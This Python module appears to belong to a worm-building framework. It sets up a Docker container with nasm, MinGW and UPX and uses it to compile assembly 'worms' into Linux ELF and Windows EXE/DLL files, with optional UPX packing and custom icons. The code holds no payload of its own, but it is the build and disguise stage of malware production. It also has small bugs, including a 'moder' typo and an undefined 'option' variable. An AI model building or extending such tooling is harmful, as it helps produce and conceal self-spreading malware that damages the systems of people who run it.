import docker
import os
from time import sleep
from typing import Union


class MultiCompCore:
    def __init__(self, master: object):
        self.master = master
        self.msg = self.master.queen.msg
        self.name = "MultiComp"
        self.dir_hive = self.master.queen.dir_hive_out
        self.dir_work = "/hive"
        self.dir_etc = os.path.join(os.path.dirname(__file__), "etc")
        self.dir_lab = "/items"
        self.dir_container_lab = "/lab"

        self.master_system_compiler = "debian"
        self.compiler_container_name = "multi_comp"
        self.docker = docker.from_env()
        self._container_id = None

        self.asm_compiler = "asm_comp.py"

        self._win = True
        self._linux = True
    
    @property
    def status(self) -> bool:
        return self.get_compiler()
    
    @property
    def compiler(self) -> Union[object, None]:
        return self.get_compiler(True)
    
    def check_master_system(self) -> bool:
        try:
            container = self.docker.images.get(self.master_system_compiler)
            return True
        except docker.errors.ImageNotFound:
            return False
    
    def create_container(self) -> object:
        comp = self.docker.containers.create(
            image=self.master_system_compiler,
            command="sleep infinity",
            name=self.compiler_container_name,
            volumes={
                self.dir_hive : {"bind" : self.dir_work, "mode" : "rw"},
                self.dir_etc : {"bind" : self.dir_lab, "moder" : "rw"}
            },
            detach=True
        )
        return comp

    def pull_image_with_progress(self, image_name):
        pull_output = self.docker.api.pull(image_name, stream=True, decode=True)
        for line in pull_output:
            if 'status' in line:
                self.msg("msg", f"Status: {line['status']}", sender=self.name)
            if 'progress' in line:
                self.msg("msg", f"Progress: {line['progress']}", sender=self.name)
            if 'id' in line:
                self.msg("msg", f"ID: {line['id']} - {line['status']} {line.get('progress', '')}", sender=self.name)
        self.msg("msg", "Downloading Complete")
    
    def get_compiler(self, check: bool = False) -> Union[None, object]:
        if not self.check_master_system():
            self.msg("error", f"[!!] ERROR '{self.name}': No master system compiler image downloaded. Install the necessary modules. [!!]")
            return None
        if self._container_id:
            return self.docker.containers.get(self._container_id)
        
        for con in self.docker.containers.list(all=True):
            if con.name == self.compiler_container_name:
                self._container_id = con.id
                comp = self.docker.containers.get(self._container_id)
                return comp

        if not check:
            return None
        return self.create_container()
    
    def exec_cmd(self, command: str) -> object:
        exec_id = self.docker.api.exec_create(self.compiler.id, f"bash -c '{command}'")
        output = self.docker.api.exec_start(exec_id, stream=True)
        for line in output:
            self.msg("msg", line.decode().strip(), sender=self.name)
    
    def install(self) -> None:
        if self.status:
            self.msg("msg", f"Core: '{self.name}' is installed")
            return
        self.msg("msg", "Start image downloads. This may take some time.", sender=self.name)
        sleep(1)
        self.pull_image_with_progress(self.master_system_compiler)
        self.msg("msg", "Get image...", sender=self.name)
        comp = self.compiler
        if not comp:
            self.msg("error", f"[!!] ERROR '{self.name}': building compiler [!!]", sender=self.name)
            return
        self.build_lab()
    
    def update_repo(self) -> None:
        self.exec_cmd("rm /etc/apt/sources.list")
        self.exec_cmd('touch /etc/apt/sources.list')
        self.exec_cmd("rm -R /etc/apt/sources.list.d/")
        self.exec_cmd('echo "deb http://deb.debian.org/debian bookworm contrib main non-free-firmware" | tee -a /etc/apt/sources.list')
        self.exec_cmd('echo "deb http://deb.debian.org/debian bookworm-updates contrib main non-free-firmware" | tee -a /etc/apt/sources.list')
        self.exec_cmd('echo "deb http://deb.debian.org/debian bookworm-backports contrib main non-free-firmware" | tee -a /etc/apt/sources.list')
        self.exec_cmd('echo "deb http://deb.debian.org/debian-security bookworm-security contrib main non-free-firmware" | tee -a /etc/apt/sources.list')
    
    def build_lab(self) -> None:
        self.msg("msg", "[!!] Start of laboratory construction .... [!!]", sender=self.name)
        self.compiler.start()
        sleep(1)
        self.update_repo()
        self.exec_cmd(f"mkdir {self.dir_container_lab}")
        self.exec_cmd("apt update")
        self.exec_cmd("apt install nasm binutils -y")
        self.exec_cmd("apt install python3 -y")
        self.exec_cmd("apt install -y gcc-mingw-w64-i686")
        self.exec_cmd("apt install -y upx-ucl")
        self.msg("msg", "Building laboratory complete. Stoping container ....")
        self.compiler.stop()
        self.msg("msg", f"[{self.name}] is ready.")
    
    def install_modules(self) -> None:
        self.msg("msg", "This Compiler has no additional modules.")
    
    
    def compile_elf32(self, worm_pipeline: object) -> object:
        self.msg("msg", f"Start Compiler: {self.name}")
        self.compiler.start()

        worm_dir = os.path.join(self.dir_work, worm_pipeline.worm_name)
        self.msg("msg", f"CMD: nasm -f elf32 -o {worm_pipeline.worm_name}.o {worm_pipeline.file_name}", sender=self.name)
        self.exec_cmd(f"cd {worm_dir} && nasm -f elf32 -o {worm_pipeline.worm_name}.o {worm_pipeline.file_name}")
        self.exec_cmd(f"cd {worm_dir} && ld -m elf_i386 -o {worm_pipeline.worm_name} {worm_pipeline.worm_name}.o")
        if worm_pipeline.gvar.get("USE_UPX"):
            self.exec_cmd(f"cd {worm_dir} && upx --lzma --force {worm_pipeline.worm_name}")
        self.exec_cmd(f"cd {worm_dir} && chmod 777 *")
        self.exec_cmd(f"cd {worm_dir} && rm {worm_pipeline.worm_name}.o")
        self.msg("msg", f"Stoping Compiler: {self.name}.")
        self.compiler.stop()
        worm_pipeline.exe_file_name = worm_pipeline.worm_name
        worm_pipeline.exe_file_path = os.path.join(worm_pipeline.work_dir, worm_pipeline.exe_file_name)
        
        return worm_pipeline
    
    def compile_win32(self, worm_pipeline: object) -> object:
        self.msg("msg", f"Start Compiler: {self.name}")
        self.compiler.start()
        worm_dir = os.path.join(self.dir_work, worm_pipeline.worm_name)
        self.msg("msg", f"CMD: nasm -f win32 {worm_pipeline.file_name}", sender=self.name)
        self.exec_cmd(f"cd {worm_dir} && nasm -f win32 {worm_pipeline.file_name}")
        icon = worm_pipeline.gvar.get("ICON")
        if icon:
            rc_path = self.prepare_icon(worm_pipeline)
            if rc_path:
                self.exec_cmd(f"cd {worm_dir} && i686-w64-mingw32-windres {rc_path} -O coff -o {worm_pipeline.worm_name}.res")
                icon = f" {worm_pipeline.worm_name}.res"
            else:
                icon = ""
        else:
            icon = ""
        if worm_pipeline.gvar.get("COMPILER_NO_DLL"):
            self.exec_cmd(f"cd {worm_dir} && i686-w64-mingw32-gcc -nostdlib -s -o {worm_pipeline.worm_name}.exe {worm_pipeline.worm_name}.obj{icon} -lkernel32 -lmsvcrt -luser32")
        else:
            self.exec_cmd(f"cd {worm_dir} && i686-w64-mingw32-gcc -o {worm_pipeline.worm_name}.exe {worm_pipeline.worm_name}.obj{icon} -luser32 -lkernel32 -lmsvcrt")
            
        if worm_pipeline.gvar.get("USE_UPX"):
            self.exec_cmd(f"cd {worm_dir} && upx --lzma --force {worm_pipeline.worm_name}.exe")
        self.exec_cmd(f"cd {worm_dir} && chmod 777 *")
        self.msg("msg", f"Stoping Compiler: {self.name}.")
        self.compiler.stop()
        worm_pipeline.exe_file_name = f"{worm_pipeline.worm_name}.exe"
        worm_pipeline.exe_file_path = os.path.join(worm_pipeline.work_dir, worm_pipeline.exe_file_name)

        return worm_pipeline
    
    def compile_win32_extra(self, worm_pipeline: object) -> object:
        worm_dir = os.path.join(self.dir_work, worm_pipeline.worm_name)
        dll_path = os.path.join(worm_dir, worm_pipeline.dll_name)
        self.msg("msg", f"Start Compiler: {self.name}")
        self.compiler.start()
        self.msg("msg", f"CMD: nasm -f win32 {worm_pipeline.file_name} -o {worm_pipeline.worm_name}.o", sender=self.name)
        self.exec_cmd(f"cd {worm_dir} && nasm -f win32 {worm_pipeline.file_name}")
        icon = worm_pipeline.gvar.get("ICON")
        if icon:
            rc_path = self.prepare_icon(worm_pipeline)
            if rc_path:
                self.exec_cmd(f"cd {worm_dir} && i686-w64-mingw32-windres {rc_path} -O coff -o {worm_pipeline.worm_name}.res")
                icon = f" {worm_pipeline.worm_name}.res"
            else:
                icon = ""
        else:
            icon = ""
        self.exec_cmd(f"cd {worm_dir} && i686-w64-mingw32-gcc -nostdlib -s -o {worm_pipeline.worm_name}.exe {worm_pipeline.worm_name}.obj{icon} {dll_path} -lkernel32 -lmsvcrt -luser32")
        self.exec_cmd(f"cd {worm_dir} && chmod 777 *")
        self.msg("msg", f"Stoping Compiler: {self.name}.")
        self.compiler.stop()
        worm_pipeline.exe_file_name = f"{worm_pipeline.worm_name}.exe"
        worm_pipeline.exe_file_path = os.path.join(worm_pipeline.work_dir, worm_pipeline.exe_file_name)
        return worm_pipeline

    
    def compile_dll(self, worm_pipeline: object) -> object:
        self.msg("msg", f"Start Compiler: {self.name}")
        self.compiler.start()
        lib_name = worm_pipeline.dll_name.split(".")[0]
        worm_dir = os.path.join(self.dir_work, worm_pipeline.worm_name)
        self.exec_cmd(f"cd {worm_dir} && nasm -f win32 {worm_pipeline.file_name} -o {lib_name}.o")
        self.exec_cmd(f"cd {worm_dir} && i686-w64-mingw32-gcc -shared {lib_name}.o {lib_name}.def -o {lib_name}.dll -nostdlib -s -lkernel32 -lmsvcrt -luser32 -lshell32 -Wl,--entry=DllMain")
        self.exec_cmd(f"cd {worm_dir} && chmod 777 *")
        self.msg("msg", f"Stoping Compiler: {self.name}.")
        worm_pipeline.dll_name = f"{lib_name}.dll"
        self.compiler.stop()
        return worm_pipeline
    
    def prepare_icon(self, worm_pipeline: object) -> Union[str, None]:
        try:
            with open(os.path.join(self.dir_hive, worm_pipeline.worm_name, f"{worm_pipeline.worm_name}.rc"), "w") as file:
                file.write(f'main ICON "{worm_pipeline.icon_name}"')
            return f"{worm_pipeline.worm_name}.rc"
        except Exception as e:
            self.msg("error", f"[!!] ERROR: I cant make 'rc' file: {e} [!!]", sender=self.name)
            self.msg("msg", "Skip add icon", sender=self.name)
            return None




 
    def compile_worm(self, worm_pipeline: object) -> object:
        if not self.compiler:
            self.msg("error", "[!!] ERROR: I cannot compile the worm. Module missing. [!!]")
            return worm_pipeline
        comp = worm_pipeline.gvar.get("COMPILER_NAME")
        match comp:
            case "MC_elf32":
                worm_pipeline = self.compile_elf32(worm_pipeline)
            case "MC_win32":
                worm_pipeline = self.compile_win32(worm_pipeline)
            case _:
                self.msg("error", f"[!!] ERROR: Unknown Compiler name: '{option.get('COMPILER_NAME')}' [!!]")
        return worm_pipeline

        